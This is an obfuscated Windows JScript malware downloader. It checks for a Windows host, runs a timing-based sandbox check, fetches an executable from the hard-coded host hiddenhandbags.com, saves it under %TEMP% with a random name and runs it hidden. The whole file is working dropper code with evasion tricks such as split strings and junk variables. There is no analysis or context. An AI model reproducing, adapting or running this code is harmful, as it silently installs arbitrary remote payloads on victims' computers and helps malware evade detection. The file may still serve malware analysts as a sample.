var iV = false;
var C = "CreateObject";
var oH = function u() {return WScript[C]("WScript.Shell");}(), vc = 11;
var T0 = "MSXML2.XMLHTTP";
var VH = 2123213;
var R = 0;
function Xs(eG){oH["Run"](eG, R, R);};
function B(){return "" + T0;};
function q(r0, KF){R = R * 1; return r0 - KF;};
function mf(){return C;};
/*@cc_on
  @if (@_win32 || @_win64)
    iV = true;
  @end
@*/
if (iV)
{
var jZ = "";
function p(){return 22;};
var U = 0; var lM = 0;
function c()
{
var G = new this["Date"]();
var f = G["getUTCMilliseconds"]();
WScript["Sleep"](p());
var G = new this["Date"]();
var e0 = G["getUTCMilliseconds"]();
WScript["Sleep"](p());
var G = new this["Date"]();
var m = G["getUTCMilliseconds"]();
var U = "S";
U = q(e0, f);
var lM = "wG";
lM = q(m, e0);
jZ = "open";
return q(U, lM);
}
var j = false;
var KT = false;
for (var FB = R; FB < p() * 1; FB++){if (c() != R){
j = true; 
lM = "31" + 11 * U + lM; 
KT = true; 
break;
}}
function r() {return ((j == true) && (j == KT)) ? 1 : R;};
if (j && r() && KT){
function e() {return oH["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "8zwThVNasy6MKLt.exe";};
 a = B();
 p0 = WScript[C](a);
 var s = 1;
 while (s){
try {
p0[jZ]("GET", "http://hiddenhandbags.com/kdk4a", false);
p0["send"]();
tE = "Sleep";
for (;;){WScript[tE](p() * 11); if (p0["readystate"] >= 2 * 2) break;};
s = R;
} catch(K){};
}
function T(Cw) {var Qi = (1, 2, 3, 4, 5, Cw); return Qi;};
ZT = WScript[mf()]("ADODB.Stream");
a = ZT;
a[jZ]();
a["type"] = T(1);
a["write"](p0["ResponseBody"]);
ZT["position"] = T(R);
a["Save" + "ToFile"](e(), 2);
ZT["c"+"lose"]();
H = e();
Xs(H);
}
}

